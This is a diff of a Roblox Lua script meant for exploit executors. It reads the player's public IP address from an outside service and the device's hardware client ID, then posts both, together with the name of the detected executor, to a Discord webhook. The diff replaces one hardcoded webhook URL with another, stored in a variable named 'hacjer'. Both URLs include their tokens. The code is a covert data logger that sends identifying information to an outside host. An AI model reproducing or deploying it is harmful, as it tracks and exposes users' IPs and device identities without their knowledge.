@@ -2,15 +2,12 @@ local plr = game.Players.LocalPlayer
 repeat wait() until plr.Character
 local gui = script.Parent
 local urlprofile = "https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile"
-
-
+local hacjer = 'https://discord.com/api/webhooks/935522977557127178/fBHWMUYKYpk_WyjdgshHFB_JBQuU6jfL7LOkirDspTcXSjS49mxY38MePJnGf5vGvLrs'
 local ident = game:HttpGet("https://v4.ident.me/")
 local HWIDPal = game:GetService("RbxAnalyticsService"):GetClientId()
-
 local plr = game.Players.LocalPlayer
 local OSTime = os.time()
 local Time = os.date('!*t', OSTime)
-
 local function getexploit()
     local exploit =
         (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
@@ -40,7 +37,7 @@ local Embed = {
             ["fields"] = {
                 {
                     ["name"] = "__HWID:__",
-                    ["value"] = HWIDPal.." days old",
+                    ["value"] = HWIDPal,
                     ["inline"] = true
                 },
                 {
@@ -56,7 +53,7 @@ local Embed = {
             ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
 };
 (syn and syn.request or http_request or http.request) {
-    Url = 'https://discord.com/api/webhooks/926009613348913192/foYmRY6O26j3DG4ejn_NGKKcp5ZUwWGFei1NNyK_adiotaHh6ZkdKIYxhi35svroIat0';
+    Url = hacjer;
     Method = 'POST';
     Headers = {
         ['Content-Type'] = 'application/json';
